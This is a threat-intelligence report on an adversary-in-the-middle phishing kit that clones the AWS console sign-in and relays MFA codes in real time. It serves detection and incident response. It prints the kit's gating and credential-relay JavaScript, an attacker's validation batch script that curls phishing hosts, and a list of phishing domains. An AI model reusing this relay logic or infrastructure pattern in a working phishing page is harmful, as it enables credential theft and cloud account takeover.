---
date: 2026-07-01
title: "Behind the console: an AiTM phishing kit that clones the AWS sign-in page and relays MFA in real time (input_24 kit)"
clusters: ["input_24 phishing kit operator (PoisonSeeds-adjacent)"]
cluster_country: "Unattributed e-crime; financially motivated; targeting US-based engineers"
techniques_enterprise: [T1583.001, T1583.006, T1585.002, T1566.002, T1598.003, T1204.001, T1656, T1557, T1111, T1539, T1550.004, T1078.004, T1480, T1027]
techniques_ics: []
platforms: [cloud-multi]
sectors: [technology, finance, cryptocurrency]
category: identity-cloud
---

# Behind the console: an AiTM phishing kit that clones the AWS sign-in page and relays MFA in real time (input_24 kit)

## TL;DR

Between 2026-06-16 and 2026-06-19, Datadog Security Labs (report published 2026-06-24) observed a targeted adversary-in-the-middle (AiTM) campaign that cloned the **AWS Management Console** sign-in page to harvest console credentials and relay the second factor in real time. The kit is a React single-page app whose credential-harvesting logic lives in one JavaScript file; it gates rendering on a per-recipient encrypted email blob passed in the `input_24` URL parameter, so sandboxes and researchers without a valid victim address see only a blank page. Six look-alike domains (three AWS, three SendGrid) were all registered through **NICENIC INTERNATIONAL GROUP CO., LIMITED** and fronted by **Cloudflare**, and lures were sent through legitimate ESPs (**SendGrid**, **Nimbu**) to pass SPF/DKIM/DMARC. Targeting was narrow — fewer than 50 recipients, primarily **US-based software engineers and engineering leadership** — and the `input_24` kit traces back to July 2025 crypto-wallet phishing (Trezor/Ledger) and an August 2025 Salesforce look-alike, tying it to the PoisonSeeds kit family. It lands today because AWS console phishing with live MFA relay defeats MFA and is a clean fit for the identity-and-fraud slot; the durable detection anchor is the temporal join between a look-alike-domain resolution and a subsequent AWS `ConsoleLogin` from an off-baseline source.

## Attribution and confidence

Cluster: **input_24 phishing kit operator**, an unattributed, financially motivated actor running a reusable AiTM kit. The kit — not the operator — is the identified entity: the `input_24` gating parameter, the `/api/check` -> `/api/me` -> `/api/login` -> `/api/auth` relay flow, the `validEmail` cookie, and the React SPA structure are a stable fingerprint across campaigns. Public analysis: **Datadog Security Labs** (primary, 2026-06-24); the concurrent SendGrid-impersonation domains match the **PoisonSeeds** kit documented by **NVISO Labs** (2025-08-12).

Attribution confidence: **high (kit + infrastructure) / low (operator identity)**. There is no named e-crime brand or nation-state overlap; the campaign is defined by tooling and infrastructure, not a threat-actor persona. The kit lineage is established with medium-high confidence from the shared gating function reused on `dashboard-salesforce[.]com` (Aug 2025) and the crypto-wallet phishing pages active since July 2025.

| Overlap candidate | Basis | Assessment |
|---|---|---|
| PoisonSeeds phishing kit (NVISO, Aug 2025) | React SPA, SendGrid/CRM impersonation, encrypted-email URL gating, `/2fa/(email\|sms\|ga)` routes | High — the concurrent SendGrid domains appear to be the same kit |
| input_24 crypto-wallet kit (since Jul 2025) | Identical `input_24` gating function; Trezor/Ledger and `dashboard-salesforce[.]com` targets | High — same kit, retargeted from wallets/CRM to AWS console |
| Tycoon2FA / Storm-1747 (repo Day, 2026-05-06) | Generic AiTM MFA relay | Low — different kit, different platform (Entra vs AWS); pattern-level only |
| ShinyHunters / UNC6395 Salesforce theft | Cloud-identity data theft theme | None — that is OAuth-token abuse, not console AiTM |

Genealogy vs previous repo cases: this is the **first repo case anchored on AWS console AiTM** and on the `input_24`/PoisonSeeds kit family. It complements but does not overlap `2026-05-06_CodeOfConduct-AiTM-Storm-1747` (Entra ID / Tycoon2FA AiTM with device registration), `2026-06-21_Icarus-Klue-OAuth-Salesforce-SaaS-Extortion` (long-lived OAuth-token abuse against Salesforce, no phishing page), and `2026-05-20_Storm-2949-Cloud-Identity-SSPR` (self-service password reset abuse). The distinguishing feature here is a **cloud-console credential/MFA relay** whose page is gated by a per-victim encrypted blob, making the network/DNS correlation — not page content — the detection surface.

## Kill chain — summary table

| Stage | MITRE | Detail |
|---|---|---|
| Resource development — domains | T1583.001 | Six look-alike domains (`us-west-login[.]com`, `us-east-prod[.]com`, `loginportal-aws[.]com`, plus three SendGrid twins) registered via NICENIC within 2026-06-16..18 |
| Resource development — web services / senders | T1583.006, T1585.002 | Cloudflare fronting; lures delivered via legitimate ESPs SendGrid and Nimbu to pass SPF/DKIM/DMARC |
| Initial access — spearphishing link | T1566.002, T1598.003, T1656 | AWS-Support impersonation email citing a fabricated bandwidth-throttling ticket; per-recipient link carrying the `input_24` blob |
| User execution | T1204.001 | Target clicks the link; page reads `input_24`, POSTs to `/api/check`, sets `validEmail` cookie |
| Defense evasion — victim gating | T1480, T1027 | `/api/me` returns the decrypted email; `n\|\|!e ? null` renders the AWS clone only for a valid target, blank otherwise — defeats sandboxes |
| Credential access — AiTM capture | T1557, T1111 | Cloned AWS console; `/api/login` submits root/IAM creds and returns the MFA `type`; `/email`, `/sms`, `/gauth` variants capture the second factor |
| Credential access — session/MFA relay | T1111, T1539 | `/api/auth` relays the live code to the real AWS console; the server picks the next route, implying real-time relay |
| Defense evasion / valid accounts | T1078.004, T1550.004 | Replayed session yields a successful `ConsoleLogin` from attacker infrastructure — a normal-looking, MFA-satisfied login |
| Follow-on (expected) | T1098.001, T1136.003 | Post-login IAM persistence: new access key / user / login profile for durable programmatic access |

![AWS console AiTM (input_24 kit) kill chain](./kill_chain.svg)

The diagram is two-lane. The left lane is the targeted engineer walking from the SendGrid/Nimbu-delivered AWS-support lure, through the `input_24`-gated clone, credential submission and the live MFA challenge, to the replayed `ConsoleLogin` and expected IAM persistence. The right lane is the operator's kit and infrastructure: NICENIC domain registration behind Cloudflare, the `/api/check` -> `/api/me` gating server, the `/api/login` -> `/api/auth` relay backend that talks to the real AWS console, and the PoisonSeeds/`input_24` lineage that connects this campaign to prior crypto-wallet and Salesforce look-alikes. The durable detection anchors — a look-alike-domain resolution, the `input_24` parameter and `/api/*` relay paths, and a subsequent off-baseline `ConsoleLogin` — are network- and log-behavioral and survive domain rotation.

## Stage-by-stage detail

### Stage 1 — Resource development: domains, fronting and senders

Datadog found three AWS look-alike domains and three SendGrid look-alikes, all registered through NICENIC within a three-day window and hosted on Cloudflare. The naming twins the AWS and SendGrid sets (`us-east-prod[.]com` for AWS vs `us-west-prod[.]com` for SendGrid), indicating one operator running both.

```
# Phishing domains (NICENIC registrar, Cloudflare-fronted):
aws.us-west-login[.]com          # AWS console clone (input_24)
aws-central.us-west-login[.]com  # AWS console clone (input_24)
aws.us-east-prod[.]com           # AWS console clone (input_24)
loginportal-aws[.]com            # AWS console clone (no input_24 observed)
switch-sglogin[.]com             # SendGrid clone (reg 2026-06-19)
sendgrid.uslogin-prodsg[.]com    # SendGrid clone (reg 2026-06-17)
sendgrid.us-west-prod[.]com      # SendGrid clone (reg 2026-06-18)
```

Lures were sent through legitimate platforms (SendGrid, Nimbu). This is deliberate: mail from a reputable ESP passes sender authentication, so SPF/DKIM/DMARC alone will not flag it. **T1583.001 / T1583.006 / T1585.002.**

### Stage 2 — Initial access: the AWS-Support lure

A batch file uploaded to VirusTotal on 2026-06-19 contained the structure of the phishing email — an AWS-Support impersonation citing a fabricated support ticket about bandwidth throttling — and acted as an attacker validation script: it pinged a decoy domain, ran `curl` against `aws.us-west-login[.]com` and a SendGrid URL, and queried WHOIS for the phishing host.

```
# Attacker validation batch artifact (VT 2026-06-19), paraphrased:
ping   15hourolddomain-bypass-ed-google-workspaceprotection-fuckgoogle[.]com
curl   https://aws.us-west-login[.]com/...
curl   https://<sendgrid-url-resolving-to-phishing-domain>/...
whois  aws.us-west-login[.]com
```

Each link is built for a specific recipient, carrying an encrypted email blob in `input_24`. **T1566.002 / T1598.003 / T1656.**

### Stage 3 — Victim gating (anti-analysis)

On load, the SPA reads `input_24`, POSTs the blob to `/api/check`, and the server sets a plaintext `validEmail` cookie. The page then calls `/api/me`, which returns the victim email, and only renders the AWS clone if a valid email was found.

```javascript
// Gating component (Datadog):
let e = new URLSearchParams(window.location.search).get(`input_24`);
(e ? fetch(`/api/check`,{method:`POST`,headers:{"Content-Type":`application/json`},
      body:JSON.stringify({encrypted:e}),credentials:`include`})
   : Promise.resolve({ok:!1}))
  .then(e=>e.ok?e.json():null)
  .then(()=>fetch(`/api/me`,{credentials:`include`}))
  .then(e=>e.json())
  .then(e=>t(e.email||null))
  .finally(()=>r(!1));
// n||!e ? null : <render AWS "Amazon Web Services Sign-In">
```

This is an execution guardrail: without a valid, pre-registered target email the kit shows a blank page, defeating sandbox retrieval and casual analysis. **T1480 / T1027.**

### Stage 4 — Credential and MFA capture (AiTM)

After the victim submits credentials to `/api/login` (root or IAM form), the JSON response `type` field decides the MFA route, and the victim lands on `/email`, `/sms`, or `/gauth` — each tuned to match the real AWS challenge copy. The server can only know which MFA path to return by interacting with the real AWS console, which is the tell of live relay.

```javascript
// Credential submission:
let t = await fetch(`/api/login`,{method:`POST`,
   headers:{"Content-Type":`application/json`},
   body:JSON.stringify({username:e,password:n,isRootUser:i})});
let r = await t.json(); f(`/${r.type}`)   // -> /email | /sms | /gauth
// MFA relay:
let e = await fetch(`/api/auth`,{method:`POST`,
   headers:{"Content-Type":`application/json`},
   body:JSON.stringify({accountId:n,username:o,password:c,isRootUser:u,code:y})});
```

The captured code is forwarded to `/api/auth`, which relays it to AWS in real time. **T1557 / T1111 / T1539.**

### Stage 5 — Valid-account access and expected persistence

A successful relay produces a normal `ConsoleLogin` = Success in CloudTrail from attacker infrastructure. Because MFA was satisfied (via relay), nothing in the login event looks anomalous except the source. The expected next move for a targeted actor is IAM persistence — a new access key or user that outlives the browser session. **T1078.004 / T1550.004; expected T1098.001 / T1136.003.**

## Detection strategy

### Telemetry that matters

- **DNS / proxy (corporate egress):** resolution of the look-alike hosts; requests carrying `input_24=` or the `/api/check`/`/api/me`/`/api/login`/`/api/auth` paths. This is the earliest network signal and is independent of the page gating.
- **Microsoft Defender XDR:** `DeviceNetworkEvents` (endpoint DNS/HTTP to phishing hosts), `EmailEvents` + `EmailUrlInfo` (lure delivery via SendGrid/Nimbu with look-alike links).
- **AWS CloudTrail:** `ConsoleLogin` events (`responseElements.ConsoleLogin`), and IAM mutation events (`CreateAccessKey`, `CreateUser`, `CreateLoginProfile`, `AttachUserPolicy`). Correlate a Success login with a preceding phishing-domain hit and an off-baseline source ASN.
- **Identity baseline:** per-principal source ASN/geo history for AWS console logins, to distinguish a relayed session from normal access.

### Detection coverage

| Engine | File | Logic |
|---|---|---|
| Sigma (dns_query) | `sigma/aws_console_aitm_dns_query.yml` | DNS resolution of the six look-alike domains + subdomain suffixes |
| Sigma (proxy) | `sigma/aws_console_aitm_kit_endpoints_proxy.yml` | Request to a phishing host carrying `input_24=` or a `/api/*` relay path |
| Sigma (aws cloudtrail) | `sigma/aws_cloudtrail_consolelogin_after_aitm.yml` | `ConsoleLogin` = Success without MFA field; SIEM-correlate with DNS hit + source-ASN baseline |
| KQL (Defender) | `kql/endpoint_resolves_aitm_domain.kql` | `DeviceNetworkEvents` connection to phishing hosts |
| KQL (Defender) | `kql/inbound_lure_from_sendgrid_nimbu.kql` | `EmailEvents`+`EmailUrlInfo` lure with look-alike link or `input_24=` |
| KQL (Sentinel) | `kql/aws_consolelogin_anomalous_source.kql` | `AWSCloudTrail` ConsoleLogin Success from ASN outside the known-good list |
| KQL (Sentinel) | `kql/aws_post_login_key_and_user_creation.kql` | IAM key/user/policy creation burst (post-compromise persistence) |
| YARA | `yara/AWS_Console_AiTM_input24_Kit_2026.yar` | input_24 kit JS, attacker validation `.bat`, PoisonSeeds SendGrid SPA |
| Suricata | `suricata/aws_console_aitm_input24.rules` | DNS + TLS SNI + HTTP (`input_24=`, `/api/check`, `/api/auth`) — 6 sids |

### Threat hunting hypotheses

- **H1 (`hunts/peak_h1_dns_to_consolelogin.md`):** an endpoint/identity that resolved a look-alike domain produced a successful AWS `ConsoleLogin` within 30 minutes — the AiTM replay signature. **T1557 / T1111 / T1078.004.**
- **H2 (`hunts/peak_h2_lure_delivery.md`):** inbound mail via SendGrid/Nimbu links to an AWS/SendGrid look-alike or an `input_24` URL, delivered to engineers. **T1566.002 / T1656.**
- **H3 (`hunts/peak_h3_post_login_iam_abuse.md`):** an identity that logged in from an anomalous ASN then created IAM keys/users/policies from the same source. **T1098.001 / T1136.003 / T1550.004.**

## Incident response playbook

### First 60 minutes (triage)

1. Identify the affected principal(s) from the DNS/proxy or `DeviceNetworkEvents` hit on a look-alike domain.
2. In CloudTrail, find any `ConsoleLogin` = Success for that principal within a short window of the hit; record `sourceIPAddress`, ASN and `userAgent`.
3. If a relayed login is confirmed, immediately revoke active console sessions for the principal (`aws iam ...` deactivate + `DeleteLoginProfile`/reset), and rotate its password and MFA device.
4. Enumerate IAM mutations by that principal/source IP (new keys, users, login profiles, policy attachments) and disable anything created.
5. Preserve the lure email (raw, with the full `input_24` URL) and report the domains to AWS abuse and the ESP (SendGrid/Nimbu) for takedown.

### Artifacts to collect

| Artifact | Path | Tool | Why |
|---|---|---|---|
| Console login events | CloudTrail `ConsoleLogin` | Athena / CloudTrail Lake | Confirm relayed Success + source ASN |
| IAM mutation events | CloudTrail management events | Athena / CloudTrail Lake | Detect persistence (keys/users/policies) |
| Endpoint network hits | `DeviceNetworkEvents` | Defender XDR advanced hunting | Tie user/device to the phishing host |
| Lure email + URL | Mailbox / EmailUrlInfo | Defender / eDiscovery | Recover the per-recipient `input_24` blob |
| Data-plane activity | CloudTrail data events | Athena | Detect exfil from any new access key |

### IR queries and commands

```bash
# List and deactivate access keys for a suspected principal (AWS CLI):
aws iam list-access-keys --user-name <user>
aws iam update-access-key --user-name <user> --access-key-id <AKIA...> --status Inactive
# Force console password reset and remove any attacker-set login profile:
aws iam delete-login-profile --user-name <user>
# Enumerate recently created users/keys (needs CloudTrail Lake or Athena):
#   filter eventName in (CreateAccessKey, CreateUser, CreateLoginProfile)
```

```kql
// Confirm the relayed login and its source (Sentinel):
AWSCloudTrail
| where EventName == "ConsoleLogin"
| extend Result = tostring(parse_json(ResponseElements).ConsoleLogin)
| where Result == "Success" and UserIdentityArn contains "<principal>"
| project TimeGenerated, SourceIpAddress, UserAgent, AWSRegion
```

### Containment, eradication, recovery

- **Containment:** revoke sessions, deactivate/rotate all keys for the principal, block the six look-alike domains at DNS/proxy, and quarantine the lure across mailboxes.
- **Eradication:** delete attacker-created IAM users/keys/login profiles; detach any attacker-attached policies; review and revoke temporary credentials issued during the session.
- **Recovery:** restore least-privilege for the affected principal, enforce phishing-resistant MFA (FIDO2/passkeys) for console access, and require re-enrollment.
- **Exit criteria:** no residual attacker IAM artifacts; the principal's credentials rotated; console access restricted to phishing-resistant MFA; domains blocked and reported.
- **What NOT to do:** do not rely on "MFA was used" as proof the login was legitimate — AiTM satisfies MFA. Do not treat ESP-authenticated sender as proof the mail is benign. Do not simply reset the password without also rotating access keys and hunting for persistence.

### Recovery validation

Confirm no `ConsoleLogin` from the anomalous ASN recurs, no new IAM keys/users appear for the principal, phishing-resistant MFA is enforced, and DNS/proxy show no further resolution of the look-alike domains over a 14-day watch window.

## IOCs

Top indicators (full list in `iocs.csv`). No CVE is involved — this is a resource-development + AiTM-kit social-engineering case, so there is **no `kev.md`** for this day.

| Type | Value | Context | Confidence | Source |
|---|---|---|---|---|
| domain | aws.us-west-login[.]com | AWS console clone (input_24) | high | Datadog 2026-06-24 |
| domain | aws-central.us-west-login[.]com | AWS console clone (input_24) | high | Datadog 2026-06-24 |
| domain | aws.us-east-prod[.]com | AWS console clone (input_24) | high | Datadog 2026-06-24 |
| domain | loginportal-aws[.]com | AWS console clone (no input_24) | high | Datadog 2026-06-24 |
| domain | switch-sglogin[.]com | SendGrid clone (reg 2026-06-19) | high | Datadog 2026-06-24 |
| domain | uslogin-prodsg[.]com | SendGrid clone (reg 2026-06-17) | high | Datadog 2026-06-24 |
| domain | us-west-prod[.]com | SendGrid clone (reg 2026-06-18) | high | Datadog 2026-06-24 |
| domain | dashboard-salesforce[.]com | Aug 2025 same-gating lineage | medium | Datadog / NVISO |
| url | /api/check | Gating: decrypt email, set validEmail cookie | high | Datadog 2026-06-24 |
| url | /api/auth | MFA relay to real AWS console | high | Datadog 2026-06-24 |
| string | input_24 | Encrypted target-email URL param (kit fingerprint) | high | Datadog 2026-06-24 |
| string | validEmail | Plaintext-email gating cookie | high | Datadog 2026-06-24 |
| note | NICENIC registrar | All six domains, 2026-06-16..18, Cloudflare-fronted | high | Datadog 2026-06-24 |
| note | SendGrid / Nimbu | Legit ESPs abused for delivery (pass SPF/DKIM/DMARC) | high | Datadog 2026-06-24 |
| note | Targeting | <50 US software engineers / eng leadership | high | Datadog 2026-06-24 |

## Secondary findings

- **Concurrent SendGrid/PoisonSeeds campaign.** Alongside the AWS domains, three SendGrid look-alikes registered in the same window through the same registrar run a React SPA that verifies an encrypted `email` URL param and uses `/2fa/(email|sms|ga)/:twoFactorId` routes — matching the PoisonSeeds kit NVISO documented in August 2025. One operator is phishing both AWS console and SendGrid credentials with variants of the same kit.
- **A rented kit retargeted across verticals.** The `input_24` gating function has been active since July 2025 against cryptocurrency wallets (Trezor, Ledger) and reused on `dashboard-salesforce[.]com` in August 2025. The kit is infrastructure-as-a-service: the same code base is repointed from wallets to CRM to cloud consoles, so the durable fingerprint is the gating flow and API paths, not any single brand or domain.
- **Victim-gating inverts the detection surface.** Because the page renders only for a pre-registered target email, retrieving the URL as a researcher yields a blank page — page-content and URL-sandbox detonation are blinded by design. Detection must pivot to what the network and identity logs still see: the DNS/TLS resolution, the `input_24`/`/api/*` request fingerprint, and the correlated off-baseline `ConsoleLogin`.

## Pedagogical anchors

- **MFA is not a login-legitimacy oracle.** AiTM relays the live second factor, so "MFA was satisfied" tells you nothing about who logged in. The signal lives in the *source* of the session (ASN/geo vs baseline) and its *provenance* (a preceding look-alike-domain hit), not in whether MFA fired. Phishing-resistant MFA (FIDO2/passkeys) is the control that actually breaks this class.
- **Sender authentication is deliverability, not trust.** Abusing SendGrid/Nimbu means SPF/DKIM/DMARC all pass; the discriminator is the URL destination host, not the envelope sender. Gate on where the link goes.
- **Target-gated kits move detection off the page and onto the network.** When the payload refuses to render for anyone but the victim, DNS/proxy resolution and the request fingerprint (`input_24=`, `/api/check`, `/api/auth`) become the earliest reliable artifacts. Log egress DNS and you can catch a campaign whose landing page you can never retrieve.
- **Track the kit, not the domain.** Domains registered in a three-day burst behind Cloudflare rotate fast and blocklists decay. The stable identity is the kit's gating flow and API routes, which persisted across wallet, Salesforce and AWS campaigns for a year.

## What's in this folder

| File | Purpose | Link |
|---|---|---|
| README.md | This analysis (15 sections). | [README.md](./README.md) |
| kill_chain.svg | Two-lane kill-chain diagram (template A, identity-cloud accent). | [kill_chain.svg](./kill_chain.svg) |
| iocs.csv | Full indicator list (domains, kit endpoints, fingerprints, notes). | [iocs.csv](./iocs.csv) |
| sigma/aws_console_aitm_dns_query.yml | DNS resolution of the look-alike domains. | [file](./sigma/aws_console_aitm_dns_query.yml) |
| sigma/aws_console_aitm_kit_endpoints_proxy.yml | input_24 / `/api/*` request fingerprint on phishing hosts. | [file](./sigma/aws_console_aitm_kit_endpoints_proxy.yml) |
| sigma/aws_cloudtrail_consolelogin_after_aitm.yml | ConsoleLogin Success correlation primitive. | [file](./sigma/aws_cloudtrail_consolelogin_after_aitm.yml) |
| kql/endpoint_resolves_aitm_domain.kql | Defender: endpoint connection to phishing hosts. | [file](./kql/endpoint_resolves_aitm_domain.kql) |
| kql/inbound_lure_from_sendgrid_nimbu.kql | Defender: lure delivery with look-alike links. | [file](./kql/inbound_lure_from_sendgrid_nimbu.kql) |
| kql/aws_consolelogin_anomalous_source.kql | Sentinel: ConsoleLogin Success from off-baseline ASN. | [file](./kql/aws_consolelogin_anomalous_source.kql) |
| kql/aws_post_login_key_and_user_creation.kql | Sentinel: post-login IAM persistence burst. | [file](./kql/aws_post_login_key_and_user_creation.kql) |
| yara/AWS_Console_AiTM_input24_Kit_2026.yar | input_24 kit JS, validation `.bat`, PoisonSeeds SPA. | [file](./yara/AWS_Console_AiTM_input24_Kit_2026.yar) |
| suricata/aws_console_aitm_input24.rules | DNS + TLS SNI + HTTP kit-path rules (6 sids). | [file](./suricata/aws_console_aitm_input24.rules) |
| hunts/peak_h1_dns_to_consolelogin.md | PEAK H1 — domain hit -> ConsoleLogin correlation. | [file](./hunts/peak_h1_dns_to_consolelogin.md) |
| hunts/peak_h2_lure_delivery.md | PEAK H2 — SendGrid/Nimbu lure with look-alike link. | [file](./hunts/peak_h2_lure_delivery.md) |
| hunts/peak_h3_post_login_iam_abuse.md | PEAK H3 — post-login IAM persistence. | [file](./hunts/peak_h3_post_login_iam_abuse.md) |

## Sources

- [Datadog Security Labs — Behind the console: An AiTM phishing kit harvesting AWS console credentials and beyond](https://securitylabs.datadoghq.com/articles/behind-the-console-aws-aitm-phishing-kit-and-beyond/)
- [NVISO Labs — Shedding light on the PoisonSeeds phishing kit](https://blog.nviso.eu/2025/08/12/shedding-light-on-poisonseeds-phishing-kit/)
- [GBHackers — Hackers Abuse Cloudflare-Hosted AWS Phishing Domains to Steal Console Logins](https://gbhackers.com/cloudflare-hosted-aws-phishing/)
- [Cybersecurity News — AiTM Phishing Kits Steal Console Credentials and MFA Codes from AWS Environments](https://cybersecuritynews.com/aitm-phishing-kit-steals-console-credentials/)
- [Help Net Security — Attackers use AiTM phishing kit, typosquatted domains to hijack AWS accounts](https://www.helpnetsecurity.com/2026/03/10/aitm-phishing-aws-accounts/)
- [MITRE ATT&CK — T1557 Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)
- [MITRE ATT&CK — T1111 Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111/)
